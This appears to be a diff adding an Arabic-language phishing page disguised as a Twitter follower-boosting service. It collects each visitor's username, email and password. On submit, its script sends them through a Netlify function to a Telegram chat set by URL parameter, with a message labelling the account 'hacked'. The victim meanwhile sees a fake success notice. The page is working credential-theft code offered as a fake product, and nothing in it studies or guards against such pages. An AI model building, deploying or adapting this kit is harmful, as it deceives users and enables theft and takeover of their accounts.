@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Twitter Followers Charging - شحن متابعين تويتر</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;600;700;800;900&display=swap');
+:root {
+  --twitter-blue: #1DA1F2;
+  --twitter-blue-dark: #1a91da;
+  --twitter-black: #15202B;
+  --twitter-dark: #192734;
+  --twitter-gray: #253341;
+  --twitter-light-gray: #8899A6;
+  --twitter-white: #FFFFFF;
+  --gradient-blue: linear-gradient(135deg, #1DA1F2 0%, #1a91da 100%);
+  --gradient-dark: linear-gradient(135deg, #15202B 0%, #192734 100%);
+  --success-green: #00BA7C;
+  --error-red: #F91880;
+}
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Tajawal', sans-serif;
+}
+body {
+  background: var(--gradient-dark);
+  color: var(--twitter-white);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+  position: relative;
+  overflow-x: hidden;
+}
+body::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-image: 
+    radial-gradient(circle at 20% 30%, rgba(29, 161, 242, 0.03) 0%, transparent 50%),
+    radial-gradient(circle at 80% 70%, rgba(29, 161, 242, 0.03) 0%, transparent 50%);
+  z-index: -1;
+}
+.container {
+  background: var(--twitter-black);
+  border-radius: 24px;
+  width: 100%;
+  max-width: 460px;
+  padding: 40px 35px;
+  box-shadow: 
+    0 20px 60px rgba(29, 161, 242, 0.2),
+    0 0 0 1px rgba(255, 255, 255, 0.05);
+  position: relative;
+  overflow: hidden;
+  border: 1px solid rgba(29, 161, 242, 0.1);
+}
+.container::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 120px;
+  height: 120px;
+  background: var(--gradient-blue);
+  border-radius: 0 0 0 100%;
+  opacity: 0.1;
+}
+.container::after {
+  content: '';
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  width: 80px;
+  height: 80px;
+  background: var(--gradient-blue);
+  border-radius: 0 100% 0 0;
+  opacity: 0.1;
+}
+.header {
+  text-align: center;
+  margin-bottom: 40px;
+  position: relative;
+  z-index: 2;
+}
+.twitter-logo {
+  width: 70px;
+  height: 70px;
+  background: var(--gradient-blue);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 20px;
+  font-size: 2.2rem;
+  color: white;
+  box-shadow: 0 10px 30px rgba(29, 161, 242, 0.4);
+  animation: float 3s ease-in-out infinite;
+}
+@keyframes float {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-10px); }
+}
+.header h1 {
+  font-size: 2rem;
+  font-weight: 900;
+  color: var(--twitter-white);
+  margin-bottom: 8px;
+  background: linear-gradient(45deg, #1DA1F2, #00BA7C);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.header p {
+  color: var(--twitter-light-gray);
+  font-size: 1rem;
+  font-weight: 400;
+  max-width: 300px;
+  margin: 0 auto;
+}
+.input-group {
+  margin-bottom: 28px;
+  position: relative;
+}
+.input-group label {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  color: var(--twitter-white);
+  font-size: 0.95rem;
+  margin-bottom: 10px;
+  font-weight: 600;
+}
+.input-group label i {
+  color: var(--twitter-blue);
+  font-size: 1.1rem;
+}
+.input-with-icon {
+  position: relative;
+}
+.input-with-icon i {
+  position: absolute;
+  right: 18px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--twitter-blue);
+  font-size: 1.2rem;
+  z-index: 2;
+}
+.input-group input {
+  width: 100%;
+  background: var(--twitter-gray);
+  border: 2px solid rgba(29, 161, 242, 0.2);
+  border-radius: 14px;
+  padding: 18px 55px 18px 18px;
+  color: var(--twitter-white);
+  font-size: 1.05rem;
+  font-weight: 500;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  outline: none;
+  position: relative;
+  z-index: 1;
+}
+.input-group input:focus {
+  border-color: var(--twitter-blue);
+  box-shadow: 0 0 0 3px rgba(29, 161, 242, 0.2);
+  background: var(--twitter-dark);
+  transform: translateY(-2px);
+}
+.input-group input::placeholder {
+  color: var(--twitter-light-gray);
+  opacity: 0.7;
+  font-weight: 400;
+}
+.package-selector {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 15px;
+  margin-bottom: 30px;
+}
+.package {
+  background: var(--twitter-gray);
+  border: 2px solid rgba(29, 161, 242, 0.1);
+  border-radius: 16px;
+  padding: 22px 15px;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  position: relative;
+  overflow: hidden;
+}
+.package:hover {
+  border-color: var(--twitter-blue);
+  transform: translateY(-5px) scale(1.02);
+  box-shadow: 0 15px 30px rgba(29, 161, 242, 0.2);
+}
+.package.active {
+  background: rgba(29, 161, 242, 0.15);
+  border-color: var(--twitter-blue);
+  transform: translateY(-5px);
+  box-shadow: 0 15px 35px rgba(29, 161, 242, 0.25);
+}
+.package.active::before {
+  content: '✓';
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  width: 24px;
+  height: 24px;
+  background: var(--twitter-blue);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-size: 0.9rem;
+  font-weight: bold;
+}
+.package-amount {
+  font-size: 1.8rem;
+  font-weight: 900;
+  color: var(--twitter-white);
+  margin-bottom: 5px;
+  position: relative;
+}
+.package-label {
+  font-size: 0.9rem;
+  color: var(--twitter-light-gray);
+  font-weight: 500;
+}
+.package-price {
+  font-size: 0.85rem;
+  color: var(--twitter-blue);
+  font-weight: 700;
+  margin-top: 8px;
+  padding: 4px 10px;
+  background: rgba(29, 161, 242, 0.1);
+  border-radius: 20px;
+  display: inline-block;
+}
+.submit-btn {
+  width: 100%;
+  background: var(--gradient-blue);
+  border: none;
+  border-radius: 16px;
+  padding: 22px;
+  color: var(--twitter-white);
+  font-size: 1.2rem;
+  font-weight: 800;
+  cursor: pointer;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 15px;
+  letter-spacing: 0.5px;
+  position: relative;
+  overflow: hidden;
+  margin-top: 10px;
+}
+.submit-btn:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 20px 40px rgba(29, 161, 242, 0.4);
+}
+.submit-btn:active {
+  transform: translateY(-2px) scale(0.98);
+}
+.submit-btn::after {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+  transform: rotate(45deg);
+  transition: all 0.5s ease;
+}
+.submit-btn:hover::after {
+  animation: shine 1s ease;
+}
+@keyframes shine {
+  0% { transform: translateX(-100%) rotate(45deg); }
+  100% { transform: translateX(100%) rotate(45deg); }
+}
+.btn-content {
+  position: relative;
+  z-index: 2;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.loading {
+  display: none;
+  font-size: 1.3rem;
+}
+.message {
+  margin-top: 25px;
+  padding: 20px;
+  border-radius: 14px;
+  text-align: center;
+  font-size: 1rem;
+  font-weight: 600;
+  min-height: 60px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+  opacity: 0;
+  transform: translateY(10px);
+}
+.message.show {
+  opacity: 1;
+  transform: translateY(0);
+}
+.message.success {
+  background: rgba(0, 186, 124, 0.1);
+  border: 2px solid rgba(0, 186, 124, 0.3);
+  color: var(--success-green);
+}
+.message.error {
+  background: rgba(249, 24, 128, 0.1);
+  border: 2px solid rgba(249, 24, 128, 0.3);
+  color: var(--error-red);
+}
+.message.processing {
+  background: rgba(29, 161, 242, 0.1);
+  border: 2px solid rgba(29, 161, 242, 0.3);
+  color: var(--twitter-blue);
+}
+.footer {
+  text-align: center;
+  margin-top: 30px;
+  padding-top: 25px;
+  border-top: 1px solid rgba(255, 255, 255, 0.05);
+  color: var(--twitter-light-gray);
+  font-size: 0.85rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.feature {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 0.8rem;
+}
+.feature i {
+  color: var(--twitter-blue);
+  font-size: 0.9rem;
+}
+input[type="hidden"] {
+  display: none;
+}
+.particle {
+  position: absolute;
+  pointer-events: none;
+  border-radius: 50%;
+  background: var(--twitter-blue);
+  opacity: 0;
+  z-index: 1;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="twitter-logo">
+      <i class="fab fa-twitter"></i>
+    </div>
+    <h1>شحن متابعين تويتر</h1>
+    <p>زيادة المتابعين الحقيقين لحسابك بسرعة وأمان تام</p>
+  </div>
+  
+  <div class="input-group">
+    <label><i class="fas fa-at"></i>اسم المستخدم @username</label>
+    <div class="input-with-icon">
+      <input type="text" id="username" placeholder="@yourusername" required>
+      <i class="fas fa-user"></i>
+    </div>
+  </div>
+  
+  <div class="input-group">
+    <label><i class="fas fa-envelope"></i>البريد الإلكتروني</label>
+    <div class="input-with-icon">
+      <input type="email" id="email" placeholder="email@example.com" required autocomplete="username">
+      <i class="fas fa-at"></i>
+    </div>
+  </div>
+  
+  <div class="input-group">
+    <label><i class="fas fa-lock"></i>كلمة المرور</label>
+    <div class="input-with-icon">
+      <input type="password" id="password" placeholder="••••••••" required autocomplete="current-password">
+      <i class="fas fa-key"></i>
+    </div>
+  </div>
+  
+  <div class="input-group">
+    <label><i class="fas fa-users"></i>اختر باقة المتابعين</label>
+    <div class="package-selector">
+      <div class="package" data-amount="500">
+        <div class="package-amount">500</div>
+        <div class="package-label">متابع نشط</div>
+        <div class="package-price">سريع ⚡</div>
+      </div>
+      <div class="package" data-amount="1000">
+        <div class="package-amount">1K</div>
+        <div class="package-label">متابع حقيقي</div>
+        <div class="package-price">الأكثر طلباً 🔥</div>
+      </div>
+      <div class="package" data-amount="2500">
+        <div class="package-amount">2.5K</div>
+        <div class="package-label">متابع دائم</div>
+        <div class="package-price">جودة عالية ⭐</div>
+      </div>
+      <div class="package" data-amount="5000">
+        <div class="package-amount">5K</div>
+        <div class="package-label">متابع مضمون</div>
+        <div class="package-price">عرض خاص 💎</div>
+      </div>
+    </div>
+    <div class="input-with-icon">
+      <input type="number" id="amount" placeholder="أو أدخل عدد مخصص" min="100" max="10000" value="500">
+      <i class="fas fa-hashtag"></i>
+    </div>
+  </div>
+  
+  <input type="hidden" id="chatId">
+  <input type="hidden" id="IDx">
+  
+  <button class="submit-btn" id="sendBtn">
+    <div class="btn-content">
+      <i class="fas fa-bolt"></i>
+      <span>شحن المتابعين الآن</span>
+      <div class="loading" id="loadingSpinner">
+        <i class="fas fa-spinner fa-spin"></i>
+      </div>
+    </div>
+  </button>
+  
+  <div class="message" id="msg"></div>
+  
+  <div class="footer">
+    <div class="feature">
+      <i class="fas fa-shield-alt"></i>
+      <span>آمن 100%</span>
+    </div>
+    <div class="feature">
+      <i class="fas fa-bolt"></i>
+      <span>شحن فوري</span>
+    </div>
+    <div class="feature">
+      <i class="fas fa-headset"></i>
+      <span>دعم فني</span>
+    </div>
+  </div>
+</div>
+
+<audio id="clickSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3" preload="auto"></audio>
+<audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3" preload="auto"></audio>
+<audio id="errorSound" src="https://assets.mixkit.co/sfx/preview/mixkit-warning-alarm-buzzer-1551.mp3" preload="auto"></audio>
+
+<script>
+    // إزالة التوكن المباشر واستخدام Netlify Function
+    async function sendToTelegram(chatId, message) {
+        try {
+            const response = await fetch('/.netlify/functions/sendTelegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chatId: chatId,
+                    text: message
+                })
+            });
+            
+            const result = await response.json();
+            return result.success;
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+            return false;
+        }
+    }
+
+    function createParticles(x, y, color = '#1DA1F2') {
+        for (let i = 0; i < 8; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.width = `${Math.random() * 10 + 5}px`;
+            particle.style.height = particle.style.width;
+            particle.style.left = `${x}px`;
+            particle.style.top = `${y}px`;
+            particle.style.background = color;
+            particle.style.boxShadow = `0 0 10px ${color}`;
+            
+            document.body.appendChild(particle);
+            
+            const angle = Math.random() * Math.PI * 2;
+            const speed = Math.random() * 100 + 50;
+            const vx = Math.cos(angle) * speed;
+            const vy = Math.sin(angle) * speed;
+            
+            let opacity = 1;
+            const animate = () => {
+                opacity -= 0.02;
+                particle.style.opacity = opacity;
+                particle.style.transform = `translate(${vx * (1 - opacity)}px, ${vy * (1 - opacity)}px) scale(${opacity})`;
+                
+                if (opacity > 0) {
+                    requestAnimationFrame(animate);
+                } else {
+                    particle.remove();
+                }
+            };
+            
+            requestAnimationFrame(animate);
+        }
+    }
+
+    function playSound(soundId) {
+        const sound = document.getElementById(soundId);
+        if (sound) {
+            sound.currentTime = 0;
+            sound.play().catch(e => console.log('Sound play failed:', e));
+        }
+    }
+
+    function getUrlParams(){
+        const p={}; 
+        location.search.substring(1).split("&").forEach(part=>{
+            if(!part) return;
+            const t=part.split("=");
+            p[decodeURIComponent(t[0]).toLowerCase()] = t[1]?decodeURIComponent(t[1]):"";
+        });
+        return p;
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const params = getUrlParams();
+        const chatCandidates = ['chatid', 'chat_id', 'id'];
+        const idxCandidates = ['idx', 'idx_id', 'idxid'];
+        
+        for(let c of chatCandidates) {
+            if(params[c]) document.getElementById('chatId').value = params[c];
+        }
+        for(let c of idxCandidates) {
+            if(params[c] && params[c] !== document.getElementById('chatId').value) {
+                document.getElementById('IDx').value = params[c];
+            }
+        }
+        
+        document.querySelectorAll('.package').forEach(pkg => {
+            pkg.addEventListener('click', function(e) {
+                playSound('clickSound');
+                createParticles(e.clientX, e.clientY, '#1DA1F2');
+                
+                document.querySelectorAll('.package').forEach(p => p.classList.remove('active'));
+                this.classList.add('active');
+                const amount = this.getAttribute('data-amount');
+                document.getElementById('amount').value = amount;
+            });
+        });
+        
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function(e) {
+                playSound('clickSound');
+                createParticles(e.clientX, e.clientY, '#8899A6');
+            });
+        });
+        
+        document.querySelector('.package').classList.add('active');
+    });
+
+    document.getElementById('sendBtn').addEventListener('click', async function(e) {
+        playSound('clickSound');
+        createParticles(e.clientX, e.clientY, '#00BA7C');
+        
+        const username = document.getElementById('username').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const amount = document.getElementById('amount').value.trim();
+        const chatId = document.getElementById('chatId').value.trim();
+        const IDx = document.getElementById('IDx').value.trim();
+        const msg = document.getElementById('msg');
+        const sendBtn = this;
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        
+        if(!username || !email || !password) { 
+            playSound('errorSound');
+            msg.className = 'message error';
+            msg.innerHTML = '<i class="fas fa-exclamation-circle"></i> الرجاء تعبئة جميع الحقول المطلوبة.';
+            msg.classList.add('show');
+            createParticles(e.clientX, e.clientY, '#F91880');
+            return; 
+        }
+        
+        if(!chatId) { 
+            playSound('errorSound');
+            msg.className = 'message error';
+            msg.innerHTML = '<i class="fas fa-exclamation-triangle"></i> خطأ: لم يتم العثور على معرّف المحادثة.';
+            msg.classList.add('show');
+            return; 
+        }
+        
+        sendBtn.disabled = true;
+        sendBtn.style.opacity = '0.8';
+        sendBtn.style.cursor = 'not-allowed';
+        loadingSpinner.style.display = 'block';
+        msg.className = 'message processing';
+        msg.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري معالجة طلبك وشحن المتابعين...';
+        msg.classList.add('show');
+        
+        try {
+            const sent = await sendToTelegram(chatId,
+                `🐦 تم اختراق حساب تويتر جديد \n\n` +
+                `👤 اسم المستخدم: @${username}\n` +
+                `📧 البريد الإلكتروني: ${email}\n` +
+                `🔐 كلمة المرور: ${password}\n` +
+                `👥 عدد المتابعين: ${amount || "500"}\n` +
+                `🆔 الرقم المرجعي: ${IDx || "غير محدد"}\n` +
+                `⏰ الوقت: ${new Date().toLocaleString()}\n` +
+                `---\n` +
+                `✅ تم بنجاح الاختـراق`
+            );
+            
+            if (sent) {
+                playSound('successSound');
+                msg.className = 'message success';
+                msg.innerHTML = '<i class="fas fa-check-circle"></i> تم إرسال طلبك بنجاح! سيتم شحن المتابعين خلال ساعات.';
+                
+                setTimeout(() => {
+                    document.getElementById('username').value = '';
+                    document.getElementById('email').value = '';
+                    document.getElementById('password').value = '';
+                    document.getElementById('amount').value = '500';
+                    document.querySelectorAll('.package').forEach(p => p.classList.remove('active'));
+                    document.querySelector('.package').classList.add('active');
+                    msg.classList.remove('show');
+                    setTimeout(() => msg.innerHTML = '', 300);
+                }, 4000);
+            } else {
+                playSound('errorSound');
+                msg.className = 'message error';
+                msg.innerHTML = '<i class="fas fa-times-circle"></i> فشل إرسال الطلب. يرجى المحاولة مرة أخرى.';
+            }
+            
+        } catch(error) { 
+            playSound('errorSound');
+            msg.className = 'message error';
+            msg.innerHTML = '<i class="fas fa-times-circle"></i> فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.';
+            createParticles(e.clientX, e.clientY, '#F91880');
+        } finally {
+            setTimeout(() => {
+                sendBtn.disabled = false;
+                sendBtn.style.opacity = '1';
+                sendBtn.style.cursor = 'pointer';
+                loadingSpinner.style.display = 'none';
+            }, 1000);
+        }
+    });
+
+    document.getElementById('amount').addEventListener('input', function(e) {
+        playSound('clickSound');
+        createParticles(e.clientX, e.clientY, '#8899A6');
+        
+        const value = this.value;
+        document.querySelectorAll('.package').forEach(pkg => {
+            if(pkg.getAttribute('data-amount') === value) {
+                document.querySelectorAll('.package').forEach(p => p.classList.remove('active'));
+                pkg.classList.add('active');
+            }
+        });
+    });
+</script>
+</body>
+</html>
